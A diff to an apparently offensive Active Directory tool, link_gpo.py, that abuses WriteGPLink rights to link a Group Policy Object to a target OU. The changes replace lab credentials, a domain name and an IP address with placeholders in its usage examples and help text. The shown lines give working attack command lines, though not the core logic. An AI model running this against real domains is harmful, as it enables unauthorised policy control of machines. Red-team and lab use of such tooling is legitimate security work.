@@ -4,10 +4,10 @@ link_gpo.py - Set gPLink on a target OU to link a GPO.
               This is the WriteGPLink abuse step.
 
 Usage:
-  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --list-ous
-  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --gpo-guid "{GUID}" --target-ou "OU=CoolComputers,DC=woke,DC=local"
-  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --gpo-guid "{GUID}" --target-ou "OU=..." --enforced
-  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --restore --target-ou "OU=..." --original-gplink "<saved value>"
+  python3 link_gpo.py -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --list-ous
+  python3 link_gpo.py -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --gpo-guid "{GUID}" --target-ou "OU=Workstations,DC=example,DC=local"
+  python3 link_gpo.py -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --gpo-guid "{GUID}" --target-ou "OU=..." --enforced
+  python3 link_gpo.py -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --restore --target-ou "OU=..." --original-gplink "<saved value>"
 
 Link flags in gPLink:
   ;0 = Enabled, not enforced
@@ -32,7 +32,7 @@ def connect(dc_ip, domain, username, password):
 
 
 def domain_to_base_dn(domain):
-    """Convert domain like woke.local to DC=woke,DC=local"""
+    """Convert domain like example.local to DC=example,DC=local"""
     return ",".join(f"DC={part}" for part in domain.split("."))
 
 
@@ -115,16 +115,16 @@ if __name__ == "__main__":
         description="Link GPO to OU via WriteGPLink",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""Examples:
-  %(prog)s -u coby -p 'Pass' -d woke.local -dc 192.168.100.67 --list-ous
-  %(prog)s -u coby -p 'Pass' -d woke.local -dc 192.168.100.67 --gpo-guid "{GUID}" --target-ou "OU=CoolComputers,DC=woke,DC=local"
-  %(prog)s -u coby -p 'Pass' -d woke.local -dc 192.168.100.67 --restore --target-ou "OU=..." --original-gplink "<value>"
+  %(prog)s -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --list-ous
+  %(prog)s -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --gpo-guid "{GUID}" --target-ou "OU=Workstations,DC=example,DC=local"
+  %(prog)s -u USER -p 'PASS' -d example.local -dc 192.0.2.10 --restore --target-ou "OU=..." --original-gplink "<value>"
         """,
     )
 
     # Auth args
     p.add_argument("-u", "--username", required=True, help="Domain username")
     p.add_argument("-p", "--password", required=True, help="Password")
-    p.add_argument("-d", "--domain", required=True, help="Domain (e.g., woke.local)")
+    p.add_argument("-d", "--domain", required=True, help="Domain (e.g., example.local)")
     p.add_argument("-dc-ip", required=True, dest="dc_ip", help="Domain controller IP")
 
     # Action args
